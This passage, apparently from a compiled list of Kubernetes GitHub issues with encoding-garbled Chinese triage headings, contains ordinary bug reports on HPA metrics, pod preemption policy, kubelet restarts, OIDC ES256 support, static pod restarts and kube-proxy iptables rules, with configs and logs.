{{name}}   Deployment/{{deployment}}   <unknown>/50%   1         10        1          105m

```

But, deployment and pod resource settings are okay.
```
kubectl get -o json deployment {{deployment}} | jq '.spec.template.spec.containers[].resources'
{
  "limits": {
    "cpu": "1",
    "memory": "1500Mi"
  },
  "requests": {
    "cpu": "500m",
    "memory": "1000Mi"
  }
}
```

metric-server  logs are find.

hpa settings are okay.

hpa.yaml
```
apiVersion: v1
items:
- apiVersion: autoscaling/v2
  kind: HorizontalPodAutoscaler
  metadata:
    labels:
      hpa.test: hpa
    name: {{name}}
    namespace: {{namespace}}
  spec:
    maxReplicas: 10
    metrics:
    - resource:
        name: cpu
        target:
          averageUtilization: 50
          type: Utilization
      type: Resource
    minReplicas: 1
    scaleTargetRef:
      apiVersion: apps/v1
      kind: Deployment
      name: {{deployment name}}

```
( cronjobs not have  `hpa.test: hpa` labels but deployment have `hpa.test: hpa` label) 


HPA make some logs

```
 k describe hpa

...
  Type     Reason                   Age                     From                       Message
  ----     ------                   ----                    ----                       -------
  Warning  FailedGetResourceMetric  49m (x13 over 101m)     horizontal-pod-autoscaler  failed to get cpu utilization: missing request for cpu in container {{cronjob container}} of Pod {{cronjob pod name}} 
  Warning  FailedGetResourceMetric  39m (x72 over 110m)     horizontal-pod-autoscaler  failed to get cpu utilization: missing request for cpu in container {{cronjob container}} of Pod {{cronjob pod name}} 
  Warning  FailedGetResourceMetric  34m (x7 over 99m)       horizontal-pod-autoscaler  failed to get cpu utilization: missing request for cpu in container {{cronjob container}}of Pod {{cronjob pod name}} 
  Warning  FailedGetResourceMetric  29m (x2 over 82m)       horizontal-pod-autoscaler  failed to get cpu utilization: missing request for cpu in container {{cronjob container}}of Pod {{cronjob pod name}} 
  Warning  FailedGetResourceMetric  19m (x4 over 63m)       horizontal-pod-autoscaler  failed to get cpu utilization: missing request for cpu in container {{cronjob container}} of Pod {{cronjob pod name}}  
  Warning  FailedGetResourceMetric  14m (x5 over 85m)       horizontal-pod-autoscaler  failed to get cpu utilization: missing request for cpu in container {{cronjob container}} of Pod {{cronjob pod name}}  
  Warning  FailedGetResourceMetric  4m50s (x167 over 106m)  horizontal-pod-autoscaler  (combined from similar

```

There are many pod which state are "Completed"

```
â¯ k get po
NAME                                                              READY   STATUS      RESTARTS      AGE
{{deployment name}}                                1/1     Running     0             19m
{{cronjob pod }}   0/1     Completed   4             7h43m
{{cronjob pod }} 0/1     Completed   3             5h43m
{{cronjob pod }}  0/1     Completed   3             163m
{{cronjob pod }}          0/1     Completed   4             6h53m

```


So, I think hpa read metric not only deployment also cronjob

#### What did you expect to happen?

I expect hpa to express an exact number

#### How can we reproduce it (as minimally and precisely as possible)?


Deploy the deployment and cronjob together and put the cronjob in completed status.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
v1.28.5 
```

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123882 pod preemptionPolicy can not set

- Issue é“¾æ¥ï¼š[#123882](https://github.com/kubernetes/kubernetes/issues/123882)

### Issue å†…å®¹

#### What happened?

root@29-b:~/k8s-core-teaching/pod# kubectl apply -f preemptionPolicy-priority-Never-without-priority.yaml  -n k8s
Error from server (Forbidden): error when creating "preemptionPolicy-priority-Never-without-priority.yaml": pods "nginx-pod" is forbidden: the string value of PreemptionPolicy (Never) must not be provided in pod spec; priority admission controller computed PreemptLowerPriority from the given PriorityClass name

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
spec:
  containers:
  - name: container
    image: nginx
  preemptionPolicy: Never
```

#### What did you expect to happen?

apply ok

#### How can we reproduce it (as minimally and precisely as possible)?

apply the yaml

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
root@29-b:~/k8s-core-teaching/pod# kubectl version
Client Version: v1.29.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.0
</details>


#### Cloud provider

<details>
wmare
</details>


#### OS version

<details>
root@29-b:~/k8s-core-teaching/pod# cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
wmare

```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123859 Pods are incorrectly rejected after kubelet restart due to NUMA and node label changes

- Issue é“¾æ¥ï¼š[#123859](https://github.com/kubernetes/kubernetes/issues/123859)

### Issue å†…å®¹

#### What happened?

1.NUMA causing rejection:
Node configuration: --cpu-manager-policy=static --memory-manager-policy=Static --topology-manager-policy=single-numa-node
InitContainer and main container's NUMA are calculated one by one.
CPU affinity is present, but in reality, the NUMA alignment of the InitContainer might not match the resource requirements of the main container.
Restarting kubelet leads to Pod rejection.
![WX20240311-175733@2x](https://github.com/kubernetes/kubernetes/assets/46776140/4ca5624f-3caa-4ba3-9518-6fb5148fe376)

2.Node Label change causing rejection:
Node has a label hpc=true, and the Pod has nodeAffinity based on this label.
Due to specific reasons, the label is removed.
Restarting kubelet results in Pod rejection with the error message: NodeAffinity failed

#### What did you expect to happen?

Regardless of the situation, kubelet should not reject Pods that are running and were created before the kubelet restart.

#### How can we reproduce it (as minimally and precisely as possible)?

I mentioned the steps in the 'what happened' section, and by following those steps, the issue can be reproduced consistently, 100% of the time.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:47:36Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:42:04Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"
$ uname -a
Linux mjq-k8stestarsenalmaster-1 5.16.20-1.el7.x86_64 #3 SMP PREEMPT Thu Aug 18 13:53:10 CST 2022 x86_64 x86_64 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd github.com/containerd/containerd v1.6.16 31aa4358a36870b21a992d3ad2bef29e1d693bec
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123840 StructuredAuthenticationConfiguration does not support ES256 algorithm

- Issue é“¾æ¥ï¼š[#123840](https://github.com/kubernetes/kubernetes/issues/123840)

### Issue å†…å®¹

#### What happened?

I'm using [Pinniped](https://pinniped.dev/docs/background/architecture/) as an OIDC provider to authenticate users. following the Pinniped documentation we need to add the following flags to the api-server to trust supervisor as OICD provider
```
# Make this exactly match the spec.issuer of your Supervisor's FederationDomain.
# Note: It seems like the kube-apiserver pod cannot resolve `cluster.local`
# DNS names, so don't use one of those DNS names as the issuer.
--oidc-issuer-url="https://my-supervisor.example.com/my-issuer"

# This is only required if the kube-apiserver pod is not going to trust your
# Supervisor's FederationDomain's TLS certificates, e.g. if you used a
# self-signed CA. Make this match where you mounted the CA PEM file into
# your control plane node's filesystem, which must be under a directory
# that the kube-apiserver container is going to volume mount.
--oidc-ca-file="/etc/ca-certificates/supervisor/root-ca.pem"

# Choose a unique value for each cluster here. By making this unique, the
# Supervisor will be able to issue ID tokens for this cluster that cannot
# be used on any other cluster, which improves security. Do not use the
# special value "pinniped-cli" or any value that contains the substring
# ".pinniped.dev", because these special values are reserved for other
# purposes.
--oidc-client-id="my-cluster-342klb7h"

# Use these exact values. These are based on how the Supervisor issues ID
# tokens. Do not change these values.
--oidc-signing-algs="ES256"
--oidc-username-claim="username"
--oidc-groups-claim="groups"
```
which works fine. However when I tried to implement the same thing using the new featureGates `StructuredAuthenticationConfiguration ` in the apiserver as follow
```
- --feature-gates=StructuredAuthenticationConfiguration=true
- --authentication-config=/etc/kubernetes/auth-config.yaml
```

The output of `auth-config.yaml`
```
apiVersion: apiserver.config.k8s.io/v1alpha1
kind: AuthenticationConfiguration
jwt:
  - issuer:
      url: https://my-supervisor.example.com/my-issuer
      audiences:
        - my-cluster-342klb7h
       certificateAuthority: |
         xxxxxxxx
    claimMappings:
      username:
        expression: 'claims.email'
      groups:
        expression: 'claims.groups'
```

I'm getting ```Unable to authenticate the request err=[invalid bearer token, oidc; verify token: oidc: id token signed with unsupported algortithm, expected [\"RSA256\"] got \"ES256\"]"```

According to the quote from the KEP, all asymmetric algorithms are allowed, which is not the case
```
Goals:
Easy migration from existing OIDC flags
Note: we intend to drop the --oidc-signing-algs flag because this configuration provides no benefit (we will always allow all asymmetric algorithms)
```
https://github.com/kubernetes/enhancements/tree/master/keps/sig-auth/3331-structured-authentication-configuration#goals

cc @cfryanr  to follow 

Any help, please? 

#### What did you expect to happen?

ES256 is an asymmetric algorithm so it should be allowed

#### How can we reproduce it (as minimally and precisely as possible)?

Allow all asymmetric algorithm 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>
1.29.1

#### Cloud provider

<details>

</details>
On premise

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>
Ubuntu 22

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>
Containerd

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123839 Static pods with restartPolicy: OnFailure remain pending if kubelet restarts after container create but before start.

- Issue é“¾æ¥ï¼š[#123839](https://github.com/kubernetes/kubernetes/issues/123839)

### Issue å†…å®¹

#### What happened?

Given a static pod with `restartPolicy: OnFailure`, and  a Kubelet crash while re-creating a failed container in the static pod, the pod may remain pending indefinitely.

1. Run a cluster with the patch at https://github.com/hoskeri/kubernetes/commit/60b103a1df145a688a72ebe1473deddec57109e0. The patch causes kubelet to crash when attempting to start a container that's been created after a failure.
2. Start a static pod with `restartPolicy: OnFailure`.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: staticpod-failure-tester
spec: 
  restartPolicy: OnFailure
  hostNetwork: true
  initContainers:
  - name: staticpod-failure-init-1
    image: "debian:unstable"
    command:
    - echo 
    - "staticpod-failure-tester-init"
  containers:
  - name: staticpod-failure-tester-main
    image: "redis:latest"
    command:
    - "redis-server"
```


4. Arm the crash to occur on the next StartContainer of our container.

echo -n staticpod-failure-tester-main > /run/crash-container-names

6. Kill the shim process and `crictl stopp $pod`. 

(Careful, modify the command to be more specific if other containers are running in your env)

`kill -9 $SHIM_PID; crictl pods -q|xargs crictl stopp`

7. Kubelet should create a replacement container for the killed container in the same sandbox.

9. Kubelet crashes and restarts on StartContainer.

10. After the first crash, kubelet will not trigger the crash again, because it will not attempt a StartContainer again. 
Instead, `computePodActions` wants to stop the existing sandbox, but this does not converge because containerd ignores the `StopContainer` request. 

```
info msg="Container to stop \"469b9ca1059f90783892692b7ecf22b967d015a390446b44ee29894026b7e46a\" must be in running or unknown state, current state \"CONTAINER_CREATED\""
```

```
kuberuntime_manager.go:1058] "computePodActions got for pod" podActions="KillPod: true, CreateSandbox: false, UpdatePodResources: false, Attempt: 3, InitContainersToStart: [], ContainersToStart: [], EphemeralContainersToStart: [],ContainersToUpdate: map[], ContainersToKill: map[]" pod="default/staticpod-failure-tester-i-ea7ab8cd-6939-4748-b544-21d797194f5e"
```

11. The pod remains `Pending` indefinitely.

The real-world version of the above sequence involves a reboot of control plane host vm while Kubelet is still recovering pods from a previous crash - so two reboots in quick succession. 

Based on my reading of the code, it seems to me that the core issue is in the `containerSucceeded` function treats an uninitialized container as having succeeded. We incorrectly read the golang zero value of `containerStatus.ExitCode` as a successful exit code of `0` from the container. 

https://github.com/kubernetes/kubernetes/blob/8f80e0146726c42edefdfaeda6123872a5ec0981/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L535

This is not an issue if the restartPolicy is `Always` because https://github.com/kubernetes/kubernetes/blob/8f80e0146726c42edefdfaeda6123872a5ec0981/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L851 is not reached in that case.



#### What did you expect to happen?

The static pod should either end at a terminal phase, or restart the successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

See reproduction steps in the main report. 

Here's a strawman change that fixes the issue for my test case. 

https://github.com/hoskeri/kubernetes/commit/5270c2916f78b78aab6845de94cd4d06b271ecd3

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.0-alpha.3.320+19df52c41a25ce
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release

PRETTY_NAME="Debian GNU/Linux trixie/sid"
NAME="Debian GNU/Linux"
VERSION_CODENAME=trixie
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux i-ea7ab8cd-6939-4748-b544-21d797194f5e 6.6.15-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04) x86_64 GNU/Linux
```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```
Type:          io.containerd.grpc.v1
ID:            cri
Requires:     
               io.containerd.event.v1
               io.containerd.service.v1
Platforms:     linux/amd64
Exports:      
               CRIVersionAlpha      v1alpha2
               CRIVersion           v1
```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
NA
</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123837 kube-proxy does not appear to be creating iptables entries

- Issue é“¾æ¥ï¼š[#123837](https://github.com/kubernetes/kubernetes/issues/123837)

### Issue å†…å®¹

#### What happened?

When setting up a new cluster using Kubernetes 1.29.2 on Debian 12.5 ("bookworm"), it appears that the necessary iptables entries to permit access to services, etc., are not being created by kube-proxy. Upon reaching the step in setting up the first control-plane node, post `kubeadm init`, at which it is necessary to add a networking option, the pods of the networking option invariably fail complaining that it is impossible to reach the Kubernetes API server via the Kubernetes service.

Things at this point appear normal except for the failed networking option pod:

```
â¯ kubectl get node
NAME                STATUS   ROLES           AGE   VERSION
princess-celestia   Ready    control-plane   55m   v1.29.2

â¯ kubectl get pod -A
NAMESPACE     NAME                                        READY   STATUS              RESTARTS       AGE
kube-system   coredns-76f75df574-62dx4                    0/1     ContainerCreating   0              55m
kube-system   coredns-76f75df574-m6dhg                    0/1     ContainerCreating   0              55m
kube-system   etcd-princess-celestia                      1/1     Running             3 (23m ago)    55m
kube-system   kube-apiserver-princess-celestia            1/1     Running             3 (22m ago)    55m
kube-system   kube-controller-manager-princess-celestia   1/1     Running             2 (23m ago)    55m
kube-system   kube-proxy-7pwnn                            1/1     Running             0              21m
kube-system   kube-scheduler-princess-celestia            1/1     Running             2 (23m ago)    55m
kube-system   weave-net-mnm4v                             1/2     CrashLoopBackOff    24 (25s ago)   50m
```

This example is from Weave, but the equivalent error also occurs in Flannel, leading me to conclude that the issue is not with them:

```
FATA: 2024/03/09 23:25:51.801940 [kube-peers] Could not get peers: Get "https://[fdc9:b01a:cafe:60::1]:443/api/v1/nodes": dial tcp [fdc9:b01a:cafe:60::1]:443: connect: network is unreachable
Failed to get peers
```

The kube-proxy pod log shows no calls to iptables:

```
I0309 23:20:38.208141       1 server_others.go:72] "Using iptables proxy"
I0309 23:20:38.212206       1 server.go:1050] "Successfully retrieved node IP(s)" IPs=["172.16.0.129"]
I0309 23:20:38.213216       1 conntrack.go:58] "Setting nf_conntrack_max" nfConntrackMax=262144
I0309 23:20:38.220948       1 server.go:652] "kube-proxy running in dual-stack mode" primary ipFamily="IPv4"
I0309 23:20:38.220959       1 server_others.go:168] "Using iptables Proxier"
I0309 23:20:38.221908       1 proxier.go:245] "Setting route_localnet=1 to allow node-ports on localhost; to change this either disable iptables.localhostNodePorts (--iptables-localhost-nodeports) or set nodePortAddresses (--nodeport-addresses) to filter loopback addresses"
I0309 23:20:38.221976       1 server.go:865] "Version info" version="v1.29.2"
I0309 23:20:38.221981       1 server.go:867] "Golang settings" GOGC="" GOMAXPROCS="" GOTRACEBACK=""
I0309 23:20:38.222805       1 config.go:315] "Starting node config controller"
I0309 23:20:38.222817       1 shared_informer.go:311] Waiting for caches to sync for node config
I0309 23:20:38.222829       1 config.go:188] "Starting service config controller"
I0309 23:20:38.222837       1 shared_informer.go:311] Waiting for caches to sync for service config
I0309 23:20:38.222939       1 config.go:97] "Starting endpoint slice config controller"
I0309 23:20:38.222943       1 shared_informer.go:311] Waiting for caches to sync for endpoint slice config
I0309 23:20:38.323006       1 shared_informer.go:318] Caches are synced for endpoint slice config
I0309 23:20:38.323015       1 shared_informer.go:318] Caches are synced for node config
I0309 23:20:38.323020       1 shared_informer.go:318] Caches are synced for service config
```

and while the chains and some relevant entries are seen, the essential ones appear to be missing, per the following output from _ip6tables-save_ and _iptables-save_:

```
root@princess-celestia:~# ip6tables-save
# Generated by ip6tables-save v1.8.9 (nf_tables) on Sat Mar  9 17:33:03 2024
*mangle
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:KUBE-IPTABLES-HINT - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-PROXY-CANARY - [0:0]
COMMIT
# Completed on Sat Mar  9 17:33:03 2024
# Generated by ip6tables-save v1.8.9 (nf_tables) on Sat Mar  9 17:33:03 2024
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:KUBE-EXTERNAL-SERVICES - [0:0]
:KUBE-FIREWALL - [0:0]
:KUBE-FORWARD - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-PROXY-FIREWALL - [0:0]
:KUBE-SERVICES - [0:0]
-A INPUT -j KUBE-FIREWALL
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A INPUT -m comment --comment "kubernetes health check service ports" -j KUBE-NODEPORTS
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A FORWARD -m comment --comment "kubernetes forwarding rules" -j KUBE-FORWARD
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A OUTPUT -j KUBE-FIREWALL
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A KUBE-FORWARD -m conntrack --ctstate INVALID -j DROP
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding rules" -m mark --mark 0x4000/0x4000 -j ACCEPT
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding conntrack rule" -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A KUBE-SERVICES -d fdc9:b01a:cafe:60::a/128 -p tcp -m comment --comment "kube-system/kube-dns:dns-tcp has no endpoints" -m tcp --dport 53 -j REJECT --reject-with icmp6-port-unreachable
-A KUBE-SERVICES -d fdc9:b01a:cafe:60::a/128 -p tcp -m comment --comment "kube-system/kube-dns:metrics has no endpoints" -m tcp --dport 9153 -j REJECT --reject-with icmp6-port-unreachable
-A KUBE-SERVICES -d fdc9:b01a:cafe:60::a/128 -p udp -m comment --comment "kube-system/kube-dns:dns has no endpoints" -m udp --dport 53 -j REJECT --reject-with icmp6-port-unreachable
COMMIT
# Completed on Sat Mar  9 17:33:03 2024
# Generated by ip6tables-save v1.8.9 (nf_tables) on Sat Mar  9 17:33:03 2024
*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-MARK-MASQ - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-POSTROUTING - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-SEP-ZW3YEZJQTUKK7ANJ - [0:0]
:KUBE-SERVICES - [0:0]
:KUBE-SVC-NPX46M4PTMTKRN6Y - [0:0]
-A PREROUTING -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A OUTPUT -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A POSTROUTING -m comment --comment "kubernetes postrouting rules" -j KUBE-POSTROUTING
-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000
-A KUBE-POSTROUTING -m mark ! --mark 0x4000/0x4000 -j RETURN
-A KUBE-POSTROUTING -j MARK --set-xmark 0x4000/0x0
-A KUBE-POSTROUTING -m comment --comment "kubernetes service traffic requiring SNAT" -j MASQUERADE --random-fully
-A KUBE-SEP-ZW3YEZJQTUKK7ANJ -s fdc9:b01a:9d26:0:8aae:ddff:fe0a:99d8/128 -m comment --comment "default/kubernetes:https" -j KUBE-MARK-MASQ
-A KUBE-SEP-ZW3YEZJQTUKK7ANJ -p tcp -m comment --comment "default/kubernetes:https" -m tcp -j DNAT --to-destination [fdc9:b01a:9d26:0:8aae:ddff:fe0a:99d8]:6443
-A KUBE-SERVICES -d fdc9:b01a:cafe:60::1/128 -p tcp -m comment --comment "default/kubernetes:https cluster IP" -m tcp --dport 443 -j KUBE-SVC-NPX46M4PTMTKRN6Y
-A KUBE-SERVICES ! -d ::1/128 -m comment --comment "kubernetes service nodeports; NOTE: this must be the last rule in this chain" -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS
-A KUBE-SVC-NPX46M4PTMTKRN6Y ! -s fdc9:b01a:cafe::/56 -d fdc9:b01a:cafe:60::1/128 -p tcp -m comment --comment "default/kubernetes:https cluster IP" -m tcp --dport 443 -j KUBE-MARK-MASQ
-A KUBE-SVC-NPX46M4PTMTKRN6Y -m comment --comment "default/kubernetes:https -> [fdc9:b01a:9d26:0:8aae:ddff:fe0a:99d8]:6443" -j KUBE-SEP-ZW3YEZJQTUKK7ANJ
COMMIT
# Completed on Sat Mar  9 17:33:03 2024
```

```
root@princess-celestia:~# iptables-save
# Generated by iptables-save v1.8.9 (nf_tables) on Sat Mar  9 17:33:35 2024
*mangle
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:KUBE-IPTABLES-HINT - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-PROXY-CANARY - [0:0]
COMMIT
# Completed on Sat Mar  9 17:33:35 2024
# Generated by iptables-save v1.8.9 (nf_tables) on Sat Mar  9 17:33:35 2024
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:KUBE-EXTERNAL-SERVICES - [0:0]
:KUBE-FIREWALL - [0:0]
:KUBE-FORWARD - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-PROXY-FIREWALL - [0:0]
:KUBE-SERVICES - [0:0]
:WEAVE-NPC - [0:0]
:WEAVE-NPC-DEFAULT - [0:0]
:WEAVE-NPC-EGRESS - [0:0]
:WEAVE-NPC-EGRESS-ACCEPT - [0:0]
:WEAVE-NPC-EGRESS-CUSTOM - [0:0]
:WEAVE-NPC-EGRESS-DEFAULT - [0:0]
:WEAVE-NPC-INGRESS - [0:0]
-A INPUT -j KUBE-FIREWALL
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A INPUT -m comment --comment "kubernetes health check service ports" -j KUBE-NODEPORTS
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A FORWARD -m comment --comment "kubernetes forwarding rules" -j KUBE-FORWARD
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A OUTPUT -j KUBE-FIREWALL
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A KUBE-FIREWALL ! -s 127.0.0.0/8 -d 127.0.0.0/8 -m comment --comment "block incoming localnet connections" -m conntrack ! --ctstate RELATED,ESTABLISHED,DNAT -j DROP
-A KUBE-FORWARD -m conntrack --ctstate INVALID -j DROP
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding rules" -m mark --mark 0x4000/0x4000 -j ACCEPT
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding conntrack rule" -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A WEAVE-NPC -m state --state RELATED,ESTABLISHED -j ACCEPT
-A WEAVE-NPC -d 224.0.0.0/4 -j ACCEPT
-A WEAVE-NPC -m physdev --physdev-out vethwe-bridge --physdev-is-bridged -j ACCEPT
-A WEAVE-NPC -m state --state NEW -j WEAVE-NPC-DEFAULT
-A WEAVE-NPC -m state --state NEW -j WEAVE-NPC-INGRESS
-A WEAVE-NPC-EGRESS -m state --state RELATED,ESTABLISHED -j ACCEPT
-A WEAVE-NPC-EGRESS -m physdev --physdev-in vethwe-bridge --physdev-is-bridged -j RETURN
-A WEAVE-NPC-EGRESS -m addrtype --dst-type LOCAL -j RETURN
-A WEAVE-NPC-EGRESS -d 224.0.0.0/4 -j RETURN
-A WEAVE-NPC-EGRESS -m state --state NEW -j WEAVE-NPC-EGRESS-DEFAULT
-A WEAVE-NPC-EGRESS -m state --state NEW -m mark ! --mark 0x40000/0x40000 -j WEAVE-NPC-EGRESS-CUSTOM
-A WEAVE-NPC-EGRESS-ACCEPT -j MARK --set-xmark 0x40000/0x40000
COMMIT
# Completed on Sat Mar  9 17:33:35 2024
# Generated by iptables-save v1.8.9 (nf_tables) on Sat Mar  9 17:33:35 2024
*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-MARK-MASQ - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-POSTROUTING - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-SERVICES - [0:0]
-A PREROUTING -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A OUTPUT -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A POSTROUTING -m comment --comment "kubernetes postrouting rules" -j KUBE-POSTROUTING
-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000
-A KUBE-POSTROUTING -m mark ! --mark 0x4000/0x4000 -j RETURN
-A KUBE-POSTROUTING -j MARK --set-xmark 0x4000/0x0
-A KUBE-POSTROUTING -m comment --comment "kubernetes service traffic requiring SNAT" -j MASQUERADE --random-fully
-A KUBE-SERVICES -m comment --comment "kubernetes service nodeports; NOTE: this must be the last rule in this chain" -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS
COMMIT
# Completed on Sat Mar  9 17:33:35 2024
```


